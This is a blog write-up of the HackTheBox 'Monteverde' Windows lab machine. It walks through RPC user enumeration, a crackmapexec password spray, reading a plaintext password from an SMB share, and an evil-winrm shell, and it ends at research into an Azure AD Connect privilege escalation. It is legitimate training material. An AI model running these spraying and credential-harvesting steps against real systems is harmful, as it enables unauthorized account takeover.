<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Monteverde just retired on Hackthebox, it’s a medium difficulty Windows box. It’s was a very interesting webless box. Still being a bit new to the Windows environment the foothold was not that easy">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Monteverde">
<meta property="og:url" content="https://hg8.sh/posts/monteverde/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Monteverde just retired on Hackthebox, it’s a medium difficulty Windows box. It’s was a very interesting webless box. Still being a bit new to the Windows environment the foothold was not that easy">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82916148-f217fa80-9f71-11ea-86cf-2c867c5c1463.png">
<meta property="article:published_time" content="2020-06-12T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.832Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="windows">
<meta property="article:tag" content="Monteverde">
<meta property="article:tag" content="SMB">
<meta property="article:tag" content="RPC">
<meta property="article:tag" content="crackmapexec">
<meta property="article:tag" content="winRM">
<meta property="article:tag" content="active directory">
<meta property="article:tag" content="ADClient">
<meta property="article:tag" content="evil-winrm">
<meta property="article:tag" content="Azure">
<meta property="article:tag" content="Azure AD Connect">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82916148-f217fa80-9f71-11ea-86cf-2c867c5c1463.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Monteverde :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/servmon/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/resolute/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum4Linux"><span class="toc-number">1.2.</span> <span class="toc-text">Enum4Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-user-accounts"><span class="toc-number">1.3.</span> <span class="toc-text">Brute-force user accounts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SABatchJobs-Shared-Folder"><span class="toc-number">1.4.</span> <span class="toc-text">SABatchJobs Shared Folder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-WinRM-shell-as-mhope"><span class="toc-number">1.5.</span> <span class="toc-text">Evil-WinRM shell as mhope</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Azure-AD-Sync-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">Azure AD Sync privilege escalation</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Monteverde
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-06-12T22:00:00.000Z" itemprop="datePublished">13-06-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      10 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="583" alt="monteverde-hackthebox" src="https://user-images.githubusercontent.com/9076747/82916148-f217fa80-9f71-11ea-86cf-2c867c5c1463.png">

<p>Monteverde just retired on Hackthebox, it’s a medium difficulty Windows box. It’s was a very interesting webless box. Still being a bit new to the Windows environment the foothold was not that easy to find for me but once you do enough recon it get pretty straightforward real life scenarios to arrive to <code>root</code>. I would recommend it if you are confortable on easy box and want to level up to a medium one.</p>
<p><strong>Tl;Dr:</strong> To get the user flag you had to enumerate users using RPC service, using password spraying you find that user use its own username as password allowing to connect to its SMB folder. In this folder we found an Azure configuration file containing credentials for user <code>mhope</code>. Then using <code>WinRM</code> protocol we can connect to <code>mhope</code> account and grab the flag.<br>To get the root flag you had to exploit an “Azure Active Directory Connect Database” privilege escalation exploit in order to retrieve <code>administrator</code> credentials and get the flag. </p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.172 monteverde.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ $ nmap -Pn -n -A -T5 -p1-65535 10.10.10.172</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.172</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain?</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-26 19:25:41Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 374.92 seconds</span><br></pre></td></tr></table></figure>

<p>As often on Windows machines we do have a lot of ports open. It’s one of the first box I see without any web server running nor SSH open. It’s going to be fun :) </p>
<h3 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h3><p>From the <code>nmap</code> result and being one of my first Windows based box I was really unsure where to start off so I decided to give a try to <code>enum4linux</code>.</p>
<blockquote>
<p>Enum4linux is a tool for enumerating information from Windows and  Samba systems.</p>
<p>It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>
<p><a target="_blank" rel="noopener" href="https://labs.portcullis.co.uk/tools/enum4linux/">https://labs.portcullis.co.uk/tools/enum4linux/</a></p>
</blockquote>
<p>Hopefully this can give us better idea of what is running on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ enum4linux 10.10.10.172 2&gt;/dev/null</span><br><span class="line">Starting enum4linux v0.8.9 </span><br><span class="line"></span><br><span class="line"> ==========================</span><br><span class="line">|    Target Information    |</span><br><span class="line"> ==========================</span><br><span class="line">Target ........... 10.10.10.172</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Password ......... <span class="string">&#x27;&#x27;</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"> ===========================================</span><br><span class="line">|    Getting domain SID <span class="keyword">for</span> 10.10.10.172    |</span><br><span class="line"> ===========================================</span><br><span class="line">Domain Name: MEGABANK</span><br><span class="line">Domain Sid: S-1-5-21-391775091-850290835-3566037492</span><br><span class="line">[+] Host is part of a domain (not a workgroup)</span><br><span class="line"></span><br><span class="line"> =============================</span><br><span class="line">|    Users on 10.10.10.172    |</span><br><span class="line"> =============================</span><br><span class="line"></span><br><span class="line">user:[Guest] rid:[0x1f5]</span><br><span class="line">user:[AAD_987d7f2f57d2] rid:[0x450]</span><br><span class="line">user:[mhope] rid:[0x641]</span><br><span class="line">user:[SABatchJobs] rid:[0xa2a]</span><br><span class="line">user:[svc-ata] rid:[0xa2b]</span><br><span class="line">user:[svc-bexec] rid:[0xa2c]</span><br><span class="line">user:[svc-netapp] rid:[0xa2d]</span><br><span class="line">user:[dgalanos] rid:[0xa35]</span><br><span class="line">user:[roleary] rid:[0xa36]</span><br><span class="line">user:[smorgan] rid:[0xa37]</span><br><span class="line"></span><br><span class="line"> =========================================</span><br><span class="line">|    Share Enumeration on 10.10.10.172    |</span><br><span class="line"> =========================================</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line"></span><br><span class="line">[+] Found domain(s):</span><br><span class="line"></span><br><span class="line">        [+] MEGABANK</span><br><span class="line">        [+] Builtin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:</span><br><span class="line">Password Complexity: Disabled</span><br><span class="line">Minimum Password Length: 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==============================</span><br><span class="line">|    Groups on 10.10.10.172    |</span><br><span class="line"> ==============================</span><br><span class="line"></span><br><span class="line">[+] Getting domain group memberships:</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\Administrator</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\krbtgt</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\mhope</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\SABatchJobs</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-ata</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-bexec</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\svc-netapp</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\dgalanos</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\roleary</span><br><span class="line">Group <span class="string">&#x27;Domain Users&#x27;</span> (RID: 513) has member: MEGABANK\smorgan</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\Administrator</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2</span><br><span class="line">Group <span class="string">&#x27;Azure Admins&#x27;</span> (RID: 2601) has member: MEGABANK\mhope</span><br><span class="line">Group <span class="string">&#x27;HelpDesk&#x27;</span> (RID: 2611) has member: MEGABANK\roleary</span><br><span class="line">Group <span class="string">&#x27;Domain Guests&#x27;</span> (RID: 514) has member: MEGABANK\Guest</span><br><span class="line">Group <span class="string">&#x27;Trading&#x27;</span> (RID: 2610) has member: MEGABANK\dgalanos</span><br><span class="line">Group <span class="string">&#x27;Operations&#x27;</span> (RID: 2609) has member: MEGABANK\smorgan</span><br><span class="line">Group <span class="string">&#x27;Group Policy Creator Owners&#x27;</span> (RID: 520) has member: MEGABANK\Administrator</span><br><span class="line"></span><br><span class="line">enum4linux complete</span><br></pre></td></tr></table></figure>

<p>The full result of <code>Enum4Linux</code> is very complete so I removed the informations we don’t need. </p>
<p>One thing that catch the eye is that <code>Password Complexity</code> is set to <code>disabled</code>. Since we have a list of user we can maybe find one account using a weak password by brute-force.</p>
<h3 id="Brute-force-user-accounts"><a href="#Brute-force-user-accounts" class="headerlink" title="Brute-force user accounts"></a>Brute-force user accounts</h3><p>Since the SMB port <code>445</code> is open we can use it to try bruteforcing account passwords. To do so I will use <a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>. </p>
<p>After having no luck with the classical <code>rockyou.txt</code> password list I decided to take a different approach. One common weak password strategy is the reuse of username as password, either when setting up a default account or out of user laziness. Maybe one of the users did so ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ crackmapexec smb 10.10.10.172 -u users.txt -p users.txt</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE</span><br><span class="line">[...]</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs</span><br></pre></td></tr></table></figure>

<p>Bingo! We got <code>SABatchJobs</code> SMB credentials.</p>
<h3 id="SABatchJobs-Shared-Folder"><a href="#SABatchJobs-Shared-Folder" class="headerlink" title="SABatchJobs Shared Folder"></a>SABatchJobs Shared Folder</h3><p>Now that we have <code>SABatchJobs</code> credentials let’s see if we can find anything in its SMB shared folder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ smbclient -U <span class="string">&#x27;SABatchJobs&#x27;</span> //10.10.10.172/users$</span><br><span class="line">Enter MYGROUP\SABatchJobs<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jan  3 14:12:48 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jan  3 14:12:48 2020</span></span><br><span class="line"><span class="string">  dgalanos                            D        0  Fri Jan  3 14:12:30 2020</span></span><br><span class="line"><span class="string">  mhope                               D        0  Fri Jan  3 14:41:18 2020</span></span><br><span class="line"><span class="string">  roleary                             D        0  Fri Jan  3 14:10:30 2020</span></span><br><span class="line"><span class="string">  smorgan                             D        0  Fri Jan  3 14:10:24 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                524031 blocks of size 4096. 519955 blocks available</span></span><br></pre></td></tr></table></figure>

<p>We have a few users folder. <code>mhope</code> one contains what’s look like an interesting configuration file named  <code>azure.xml</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; <span class="built_in">cd</span> mhope\</span><br><span class="line">smb: \mhope\&gt; ls</span><br><span class="line">  .                                   D        0  Fri Jan  3 14:41:18 2020</span><br><span class="line">  ..                                  D        0  Fri Jan  3 14:41:18 2020</span><br><span class="line">  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020</span><br><span class="line"></span><br><span class="line">                524031 blocks of size 4096. 519955 blocks available</span><br><span class="line">smb: \mhope\&gt; get azure.xml</span><br><span class="line">getting file \mhope\azure.xml of size 1212 as azure.xml (9.0 KiloBytes/sec) (average 9.0 KiloBytes/sec)</span><br><span class="line">smb: \mhope\&gt; <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ cat azure.xml</span><br><span class="line">&lt;Objs Version=<span class="string">&quot;1.1.0.1&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br><span class="line">  &lt;Obj RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">    &lt;TN RefId=<span class="string">&quot;0&quot;</span>&gt;</span><br><span class="line">      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;StartDate&quot;</span>&gt;2020-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;DT N=<span class="string">&quot;EndDate&quot;</span>&gt;2054-01-03T05:35:00.7562298-08:00&lt;/DT&gt;</span><br><span class="line">      &lt;G N=<span class="string">&quot;KeyId&quot;</span>&gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;</span><br><span class="line">      &lt;S N=<span class="string">&quot;Password&quot;</span>&gt;4n0therD4y@n0th3r$&lt;/S&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;% </span><br></pre></td></tr></table></figure>

<p>We got lucky there is a password in it. Is that <code>mhope</code> account password ? </p>
<p>SSH is not open but WinRM port <code>5985</code> is, so we should be able to get a shell from there. As a reminder:</p>
<blockquote>
<p>WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">https://docs.microsoft.com/en-us/windows/win32/winrm/portal</a></p>
</blockquote>
<h3 id="Evil-WinRM-shell-as-mhope"><a href="#Evil-WinRM-shell-as-mhope" class="headerlink" title="Evil-WinRM shell as mhope"></a>Evil-WinRM shell as mhope</h3><p>To get a WinRM shell I am going to use <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm"><code>Evil-WinRM</code></a> tools which provide numerous super useful <a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm#features">features</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ evil-winrm -i 10.10.10.172 -u mhope -p <span class="string">&quot;4n0therD4y@n0th3r$&quot;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2.3</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; <span class="built_in">type</span> ../Desktop/user.txt</span><br><span class="line">4xxxxxxxxxxxxxxx2</span><br></pre></td></tr></table></figure>



<h2 id="Root-FLag"><a href="#Root-FLag" class="headerlink" title="Root FLag"></a>Root FLag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s try to get more information about our current user <code>mhope</code>:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">[<span class="type">USER</span> <span class="type">INFORMATION</span></span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="type">Name</span>      <span class="type">SID</span></span><br><span class="line">============== ============================================</span><br><span class="line"><span class="type">megabank</span>\<span class="type">mhope</span> <span class="type">S</span>-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">391775091</span>-<span class="number">850290835</span>-<span class="number">3566037492</span>-<span class="number">1601</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">GROUP</span> INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"><span class="built_in">Group</span> Name                                  <span class="built_in">Type</span>             SID                                          </span><br><span class="line">=========================================== ================ ============================================ </span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line">MEGABANK\Azure Admins                       <span class="built_in">Group</span>            S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-391775091</span><span class="literal">-850290835</span><span class="literal">-3566037492</span><span class="literal">-2601</span> </span><br><span class="line"></span><br><span class="line">[<span class="type">...</span>]</span><br></pre></td></tr></table></figure>

<p>One of the most noteworthy information is that <code>mhope</code> belongs to <code>Azure Admins</code> group. Which makes sense after finding the <code>azure.xml</code> config file earlier.</p>
<p>Let’s dig a bit more to see if we can find more informations related to <code>Azure</code>.</p>
<p>While looking around at running services we stumble upon a service named <code>Azure AD Connect Health Sync</code>:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\mhope\Documents&gt; services</span><br><span class="line"></span><br><span class="line">Path                                                                                                                            Privileges Service</span><br><span class="line">----                                                                                                                            ---------- -------</span><br><span class="line">[<span class="type">...</span>]</span><br><span class="line"><span class="string">&quot;C:\Program Files\Microsoft Azure AD Connect Health Sync Agent\Insights\Microsoft.Identity.AadConnect.Health.AadSync.Host.exe&quot;</span>       False AzureADConnectHealthSyncInsights</span><br></pre></td></tr></table></figure>

<p>The <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect">Microsoft documentation</a> explains what this service is used for:</p>
<blockquote>
<p>Azure AD Connect is the Microsoft tool designed to meet and accomplish your hybrid identity goals. It provides the following features:</p>
<ul>
<li>Password hash synchronization - A sign-in method that synchronizes a hash of a users on-premises AD password with Azure AD.</li>
<li>Pass-through authentication - A sign-in method that allows users to use the same password on-premises and in the cloud, but doesn’t require the additional infrastructure of a federated environment.</li>
<li>Federation integration - Federation is an optional part of Azure AD Connect and can be used to configure a hybrid environment using an on-premises AD FS infrastructure. It also provides AD FS management capabilities such as certificate renewal and additional AD FS server deployments.</li>
<li>Synchronization - Responsible for creating users, groups, and other objects. As well as, making sure identity information for your on-premises users and groups is matching the cloud. This synchronization also includes password hashes.</li>
<li>Health Monitoring - Azure AD Connect Health can provide robust monitoring and provide a central location in the Azure portal to view this activity.</li>
</ul>
</blockquote>
<p>The <code>Password hash synchronization</code> and <code>Pass-through authentication</code> might be interesting to escalate our privileges. It may me worth digging a bit this service.</p>
<p>While searching for more informations we stumbled upon a quite interesting article : “<a target="_blank" rel="noopener" href="https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/">Azure AD Connect Database Privilege Escalation Exploit</a>“:</p>
<blockquote>
<p>Its possible to just run some simple .NET or Powershell code on the server where Azure AD Connect is installed and instantly get plain text credentials for whatever AD account it is set to use!</p>
</blockquote>
<p>We can also find a few other <a target="_blank" rel="noopener" href="https://blog.xpnsec.com/azuread-connect-for-redteam/">articles explaining in details this vulnerability</a>.</p>
